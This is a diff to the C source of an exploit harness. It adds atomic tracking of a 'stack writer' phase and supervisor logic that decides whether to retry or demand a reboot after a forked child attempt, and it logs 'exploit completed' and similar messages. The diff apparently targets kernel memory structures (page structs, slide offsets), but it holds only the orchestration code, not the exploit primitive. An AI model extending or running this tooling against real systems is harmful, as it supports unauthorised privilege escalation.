@@ -21,7 +21,7 @@ struct app_p0_shared_state {
   atomic_int dirty;
   atomic_int slide_ready;
   atomic_int p0_ready;
-  atomic_int writer_started;
+  atomic_int writer_state;
   _Atomic uintptr_t offset;
   _Atomic uintptr_t gate_page_struct;
   _Atomic uintptr_t probe_page_struct;
@@ -55,10 +55,50 @@ void app_publish_p0_dirty(void) {
   atomic_store(&app_p0_state->dirty, 1);
 }
 
-void app_publish_writer_started(void) {
-  if (app_p0_state) {
-    atomic_store(&app_p0_state->writer_started, 1);
+void app_publish_writer_armed(void) {
+  if (!app_p0_state) return;
+  int expected = CZG3_WRITER_NOT_ARMED;
+  if (atomic_compare_exchange_strong(&app_p0_state->writer_state, &expected,
+                                     CZG3_WRITER_ARMED)) {
+    return;
   }
+  expected = CZG3_WRITER_CLEAN_PRE_ENTRY_MISS;
+  atomic_compare_exchange_strong(&app_p0_state->writer_state, &expected,
+                                 CZG3_WRITER_ARMED);
+}
+
+void app_publish_writer_entered(void) {
+  if (!app_p0_state) return;
+  int expected = CZG3_WRITER_ARMED;
+  atomic_compare_exchange_strong(&app_p0_state->writer_state, &expected,
+                                 CZG3_WRITER_ENTERED);
+}
+
+void app_publish_writer_returned(int child_status) {
+  if (!app_p0_state) return;
+  int state = atomic_load(&app_p0_state->writer_state);
+  if (WIFEXITED(child_status) && state == CZG3_WRITER_ARMED) {
+    atomic_store(&app_p0_state->writer_state,
+                 CZG3_WRITER_RETURNED_CLEANUP_UNPROVEN);
+  } else if (state == CZG3_WRITER_ENTERED) {
+    atomic_store(&app_p0_state->writer_state,
+                 CZG3_WRITER_RETURNED_UNCERTAIN);
+  }
+}
+
+void app_publish_writer_possible_mutation(void) {
+  if (!app_p0_state) return;
+  int state = atomic_load(&app_p0_state->writer_state);
+  while (state != CZG3_WRITER_POSSIBLE_MUTATION &&
+         state != CZG3_WRITER_VERIFIED_SUCCESS &&
+         !atomic_compare_exchange_weak(&app_p0_state->writer_state, &state,
+                                       CZG3_WRITER_POSSIBLE_MUTATION)) {
+  }
+}
+
+void app_publish_writer_verified_success(void) {
+  if (!app_p0_state) return;
+  atomic_store(&app_p0_state->writer_state, CZG3_WRITER_VERIFIED_SUCCESS);
 }
 
 #endif
@@ -228,14 +268,32 @@ __attribute__((constructor)) static void load(void) {
       pr_error("waitpid attempt=%d pid=%d errno=%d\n",
                attempt, child, errno);
     }
-    if (waited == child && WIFEXITED(status) && WEXITSTATUS(status) == 0) {
+    int child_succeeded =
+        waited == child && WIFEXITED(status) && WEXITSTATUS(status) == 0;
+#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
+    enum czg3_writer_phase writer_state = (enum czg3_writer_phase)atomic_load(
+        &app_p0_state->writer_state);
+#endif
+    if (child_succeeded) {
       pr_success("exploit completed attempt=%d/%d\n", attempt, max_attempts);
       return;
     }
 
 #if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
-    if (atomic_load(&app_p0_state->writer_started)) {
-      pr_error("stack writer ran; refusing retry on this boot\n");
+    enum czg3_supervisor_decision writer_decision =
+        czg3_supervisor_decide(child_succeeded, writer_state);
+    pr_info("supervisor child outcome attempt=%d/%d writer_state=%s "
+            "wait_kind=%s wait_value=%d retry=%d reboot_required=%d\n",
+            attempt, max_attempts, czg3_writer_phase_name(writer_state),
+            WIFEXITED(status) ? "exit" :
+                (WIFSIGNALED(status) ? "signal" : "other"),
+            WIFEXITED(status) ? WEXITSTATUS(status) :
+                (WIFSIGNALED(status) ? WTERMSIG(status) : status),
+            writer_decision == CZG3_SUPERVISOR_RETRY,
+            writer_decision == CZG3_SUPERVISOR_REBOOT_REQUIRED);
+    if (writer_decision != CZG3_SUPERVISOR_RETRY) {
+      pr_error("writer route outcome is mutation-uncertain; refusing retry "
+               "on this boot (reboot required)\n");
       break;
     }
 #endif
@@ -291,6 +349,7 @@ __attribute__((constructor)) static void load(void) {
 #endif
   }
 
-  pr_error("exploit failed after %d independent attempts\n", max_attempts);
+  pr_error("exploit stopped after at most %d configured attempts; see "
+           "supervisor outcome for effective retry policy\n", max_attempts);
   _exit(1);
 }
